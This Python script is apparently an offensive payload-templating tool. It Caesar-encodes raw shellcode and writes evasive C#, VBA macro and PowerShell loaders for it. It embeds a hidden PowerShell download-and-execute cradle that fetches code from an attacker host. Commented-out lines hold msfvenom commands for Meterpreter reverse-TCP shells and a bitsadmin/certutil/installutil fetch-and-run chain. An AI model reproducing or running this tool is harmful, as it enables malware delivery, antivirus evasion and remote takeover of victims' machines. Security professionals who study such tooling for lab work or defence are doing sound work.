#!/usr/bin/env python3
import subprocess, os, binascii, shutil
from Crypto.Cipher import AES

# TO CHANGE ACCORDINGLY
LHOST="192.168.49.77"
LPORT="443"
SHIFT = 17
payload_dir = "payload/"


class Encryptor():
    def encrypt():
        pass

class CaesarCipherEncryption(Encryptor):
    def encrypt(payload: bytes, shift:int):
        """Encrypts or decrypts data using a Caesar cipher.

        Args:
            data: The data to encrypt or decrypt, as bytes.
            shift: The amount to shift the data, as an integer.

        Returns:
            The encrypted or decrypted data, as bytes.
        """
        return bytes((c + shift) % 256 for c in payload)

class Templater():
    def __init__(self, payload: bytes, filename:str, template_path: str, output_path:str, encryptor:Encryptor=CaesarCipherEncryption):
        self.payload = payload
        self.filename = filename
        self.template_path = template_path
        self.output_path = output_path
        self.encryptor = encryptor

    def convert_to_code():
        pass

    def save_code():
        pass

class CSharpTemplater(Templater):
    def __init__(self, payload:bytes, filename:str, template_path:str="templates/cs/", output_path:str="code/cs/"):
        super().__init__(payload, filename, template_path, output_path)

    @staticmethod
    def convert_to_code(buffer:bytes, name:str):
        buf = binascii.hexlify(buffer).decode()
        buffer = (",".join(["0x" + buf[i:i + 2] for i in range(0, len(buf), 2)]))
        return f'byte[] {name} = new byte[] {{ {buffer} }};'
    
    def save_code(self, code: str, filename_no_ext:str):
        with open(os.path.join(f'{self.output_path}{self.filename}/', filename_no_ext+".cs"), "w") as exp:
            enc_payload = self.encryptor.encrypt(self.payload, SHIFT)
            updated_code = code.replace('$Buffer', self.convert_to_code(enc_payload, 'buf')).replace('$Shift', str(SHIFT)).replace("$LHOST", LHOST)
            exp.write(updated_code) 

class VBATemplater(Templater):
    def __init__(self, payload:bytes, filename:str, template_path:str="templates/vba/", output_path:str="code/vba/"):
        super().__init__(payload, filename, template_path, output_path)

    @staticmethod
    def convert_to_code(buffer:bytes, name:str):
        buf = ",".join([str(byte) for byte in buffer])
        # buf = " _\n".join([str(buf[i:i+252]) for i in range(0, len(buf), 252)])
        # buf = " _\n".join([str(buf[buf.find(',', i)-1:buf.find(',', i+15)]) for i in range(0, buf.count(','), 15)])
        buf_list = buf.split(',')
        res = ""
        for i in range(len(buf_list)):
            if i % 25 == 0 and i != 0:
                res += " _\n"
            if i == len(buf_list)-1:
                res +=  str(f'{buf_list[i]}')
                continue

            res += str(f'{buf_list[i]},')
            
        # buf = ",".join([str(item) for item in temp])
        return f'{name} = Array({res})'
    
    @staticmethod
    def wmi_caesar_cipher_encrypt(payload:str, key:int):
        output = ""
        for i in range(len(payload)):
            char_code = ord(payload[i])
            char_code += key
            output += str(char_code).zfill(3)
            if i % 250 == 0 and i != 0:
                output += f'"\n Apples  = Apples & "'
        return output
    
    def save_code(self, code: str, filename_no_ext:str):
        with open(os.path.join(f'{self.output_path}{self.filename}/', filename_no_ext+".vba"), "w") as exp:
            # Use cmd payload accordingly
            cmd = f"powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://{LHOST}/run1.txt'))"
            # cmd = fr'cmd.exe /c del C:\Windows\Tasks\exploit.enc && del c:\Windows\Tasks\a.exe && bitsadmin /Transfer theJob /priority foreground http://{LHOST}/exploit.enc C:\Windows\Tasks\exploit.enc && certutil -decode C:\Windows\Tasks\exploit.enc C:\Windows\Tasks\a.exe && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\a.exe'
            enc_payload = self.encryptor.encrypt(self.payload, SHIFT)
            updated_code = code.replace('$Buffer', self.convert_to_code(enc_payload, 'buf')).replace('$Shift', str(SHIFT)).replace('$WMIPayload', self.wmi_caesar_cipher_encrypt(cmd, SHIFT))
            exp.write(updated_code) 

class PSTemplater(Templater):
    def __init__(self, payload:bytes, filename:str, template_path:str="templates/ps/", output_path:str="code/ps/"):
        super().__init__(payload, filename, template_path, output_path)

    @staticmethod
    def convert_to_code(buffer:bytes, name:str):
        buf = binascii.hexlify(buffer).decode()
        buffer = (",".join(["0x" + buf[i:i + 2] for i in range(0, len(buf), 2)]))
        return f'[Byte[]] ${name} = {buffer}'
    
    def save_code(self, code: str, filename_no_ext:str):
        with open(os.path.join(f'{self.output_path}{self.filename}/', filename_no_ext+".ps1"), "w") as exp:
            enc_payload = self.encryptor.encrypt(self.payload, SHIFT)
            updated_code = code.replace('$Buffer', self.convert_to_code(enc_payload, 'buf')).replace('$Shift', str(SHIFT))
            exp.write(updated_code) 

class EncrpytionTemplateHandler():
    def __init__(self, templater:Templater):
        self.templater = templater

    def save_code(self):
        for filename in os.listdir(self.templater.template_path):
            filename_no_ext = filename[:filename.index('.')]
            code  = read_file_from_directory_with_ext(self.templater.template_path, filename, '.txt').decode()
            self.templater.save_code(code, filename_no_ext)

def read_file_from_directory_with_ext(path:str, filename:str, ext:str):
    """Read file from directory containing extension

        Args:
            path: Path to be read
            ext: File extension to be checked
        
        Returns:
            File as bytes
    """
    if filename.endswith(ext):
        with open(os.path.join(path, filename), 'rb') as file:
            return file.read()

def refresh_directories():
    for dirpath in ['code/cs/', 'code/vba/', 'code/ps/']:
        # Clear Directories
        if os.path.exists(dirpath) and os.path.isdir(dirpath):
            shutil.rmtree(dirpath)



if __name__ == "__main__":

    # command64 = f"/usr/bin/msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -f raw -o payload/reverse64.bin 2>/dev/null"
    # command32 = f"/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -f raw -o payload/reverse32.bin 2>/dev/null"
    # ping = f"/usr/bin/msfvenom -p windows/x64/exec CMD='ping -n 3 {LHOST}' EXITFUNC=thread -f raw -o payload/ping.bin"
    # subprocess.run(command64, shell=True, stdout=subprocess.DEVNULL)
    # subprocess.run(command32, shell=True, stdout=subprocess.DEVNULL)
    # subprocess.run(ping, shell=True, stdout=subprocess.DEVNULL)
    # print("Payload Generated OK")
    print("Refreshing Code Directory...")
    refresh_directories()
    for filename in os.listdir(payload_dir):
        if filename.endswith(".bin"):
            filename_no_ext = filename[:filename.index('.')]
            # Create Directories
            for dirpath in ['code/cs/', 'code/vba/', 'code/ps/']:
                os.makedirs(f'{dirpath}{filename_no_ext}/')
            payload  = read_file_from_directory_with_ext(payload_dir, filename, '.bin')
            csharp_templater = EncrpytionTemplateHandler(CSharpTemplater(payload, filename_no_ext))
            csharp_templater.save_code()
            vba_templater = EncrpytionTemplateHandler(VBATemplater(payload, filename_no_ext))
            vba_templater.save_code()
            ps_templater = EncrpytionTemplateHandler(PSTemplater(payload, filename_no_ext))
            ps_templater.save_code()
